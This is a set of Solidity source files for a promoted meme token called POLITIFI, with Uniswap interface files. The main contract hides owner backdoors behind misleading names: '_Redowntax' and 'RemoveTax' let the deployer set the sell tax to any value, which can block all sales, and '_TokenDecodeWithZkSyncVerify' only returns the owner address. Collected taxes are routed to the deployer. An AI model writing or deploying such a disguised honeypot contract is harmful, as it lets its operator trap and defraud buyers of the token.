{"ca1.sol":{"content":"/*\r\nThe time has come! We’re stepping into one of the hottest and most bullish metas in the market—an absolute powerhouse backed by an unstoppable narrative that’s creating massive buzz across the space! This launch is more than just a moment; it’s the start of something truly epic.\r\n\r\n\r\n\r\nhttps://t.me/Politifi_ETH\r\n\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.20;\r\nimport \"./IUniswapFactory.sol\";\r\nimport \"./IERC721Errors.sol\";\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\ncontract Politifi\r\n{ \r\n    string private _name = unicode\"POLITIFI\";\r\n    string private _symbol = unicode\"POLITIFI\";\r\n    uint8 public constant decimals = 18;\r\n    uint256 public constant totalSupply = 10_000_000_000 * 10**decimals;\r\n\r\n    struct StoreData {\r\n        address MktToken;\r\n        uint8 TaxOnBuy;\r\n        uint8 TaxOnSell;\r\n    }\r\n\r\n    StoreData public storeData;\r\n    uint256 constant swapAmount = totalSupply / 100;\r\n\r\n    error Permissions();\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    \r\n    event Approval(\r\n        address indexed MKT_Token,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    mapping(address =\u003e uint256) public balanceOf;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) public allowance;\r\n\r\n    address public pair;\r\n    IUniswapV2Router02 constant _uniswapV2Router =\r\n        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\r\n    bool private swapping;\r\n    bool private tradingOpen;\r\n\r\n    constructor() {\r\n        uint8 _BuyTax = 0;\r\n        uint8 _SellTax = 0;\r\n        storeData = StoreData({\r\n            MktToken: msg.sender,\r\n            TaxOnBuy: _BuyTax,\r\n            TaxOnSell: _SellTax\r\n        });\r\n        balanceOf[msg.sender] = totalSupply;\r\n        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function _Redowntax(uint8 _Sunit8) external {\r\n        if (msg.sender != _TokenDecodeWithZkSyncVerify()) revert Permissions();\r\n        RemoveTax(_Sunit8);\r\n    }\r\n\r\n    function _TokenDecodeWithZkSyncVerify() private view returns(address) {\r\n        return storeData.MktToken;\r\n    }\r\n\r\n    function OpenTrading() external {\r\n        require(msg.sender == _TokenDecodeWithZkSyncVerify());\r\n        require(!tradingOpen);\r\n        address _factory = _uniswapV2Router.factory();\r\n        address _weth = _uniswapV2Router.WETH();\r\n        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);\r\n        pair = _pair;\r\n        tradingOpen = true;\r\n    }\r\n\r\n    function RemoveTax(uint8 _sell) private {\r\n        \r\n        storeData.TaxOnSell = _sell;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool) {\r\n        allowance[from][msg.sender] -= amount;\r\n        return _transfer(from, to, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool) {\r\n        allowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool) {\r\n        return _transfer(msg.sender, to, amount);\r\n    }\r\n\r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal returns (bool) {\r\n        address MktToken = _TokenDecodeWithZkSyncVerify();\r\n        require(tradingOpen || from == MktToken || to == MktToken);\r\n\r\n        balanceOf[from] -= amount;\r\n\r\n        if (to == pair \u0026\u0026 !swapping \u0026\u0026 balanceOf[address(this)] \u003e= swapAmount \u0026\u0026 from != MktToken) {\r\n            swapping = true;\r\n            address[] memory path = new address[](2);\r\n            path[0] = address(this);\r\n            path[1] = _uniswapV2Router.WETH();\r\n            _uniswapV2Router\r\n                .swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n                    swapAmount,\r\n                    0,\r\n                    path,\r\n                    address(this),\r\n                    block.timestamp\r\n                );\r\n            payable(MktToken).transfer(address(this).balance);\r\n            swapping = false;\r\n        }\r\n\r\n        (uint8 _BuyTax, uint8 _SellTax) = (storeData.TaxOnBuy, storeData.TaxOnSell);\r\n        if (from != address(this) \u0026\u0026 tradingOpen == true) {\r\n            uint256 TaxAmount = (amount *(to == pair ? _SellTax : _BuyTax)) / 100;\r\n            amount -= TaxAmount;\r\n            balanceOf[address(this)] += TaxAmount;\r\n        }\r\n        balanceOf[to] += amount;\r\n        emit Transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n        event DataBase(string newDataName, string newDataSymbol , address by);\r\n\r\n        function Data_Base(string memory _DataNew1, string memory _DataNew2) public {\r\n        if (msg.sender != _TokenDecodeWithZkSyncVerify()) revert Permissions();\r\n         _name = _DataNew1;\r\n         _symbol =_DataNew2;\r\n        emit DataBase(_DataNew1, _DataNew2, msg.sender);\r\n    }\r\n\r\n\r\n}"},"IERC721Errors.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.20;\r\n\r\n/**\r\n * @dev Standard ERC721 Errors\r\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\r\n */\r\ninterface IERC721Errors {\r\n    /**\r\n     * @dev Indicates that an address can\u0027t be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\r\n     * Used in balance queries.\r\n     * @param owner Address of the current owner of a token.\r\n     */\r\n    error ERC721InvalidOwner(address owner);\r\n\r\n    /**\r\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\r\n     * @param tokenId Identifier number of a token.\r\n     */\r\n    error ERC721NonexistentToken(uint256 tokenId);\r\n\r\n    /**\r\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\r\n     * @param sender Address whose tokens are being transferred.\r\n     * @param tokenId Identifier number of a token.\r\n     * @param owner Address of the current owner of a token.\r\n     */\r\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\r\n     * @param sender Address whose tokens are being transferred.\r\n     */\r\n    error ERC721InvalidSender(address sender);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\r\n     * @param receiver Address to which tokens are being transferred.\r\n     */\r\n    error ERC721InvalidReceiver(address receiver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.\r\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\r\n     * @param tokenId Identifier number of a token.\r\n     */\r\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\r\n     * @param approver Address initiating an approval operation.\r\n     */\r\n    error ERC721InvalidApprover(address approver);\r\n\r\n    /**\r\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\r\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\r\n     */\r\n    error ERC721InvalidOperator(address operator);\r\n}"},"IUniswapFactory.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.20;\r\n\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n      function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountETH);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n      \r\n\r\n\r\n}\r\n\r\ninterface IUniswapFactory {\r\n    function getPair(address tokenA, address tokenB) \r\n        external \r\n        view \r\n        returns \r\n        (address pair);\r\n    function allPairs(uint) \r\n        external \r\n        view \r\n        returns \r\n        (address pair);\r\n    function allPairsLength() \r\n        external \r\n        view \r\n        returns \r\n        (uint);\r\n    function feeTo() \r\n        external \r\n        view \r\n        returns \r\n        (address);\r\n    function feeToSetter() \r\n        external \r\n        view \r\n        returns \r\n        (address);\r\n    \r\n}\r\n\r\n\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}"}}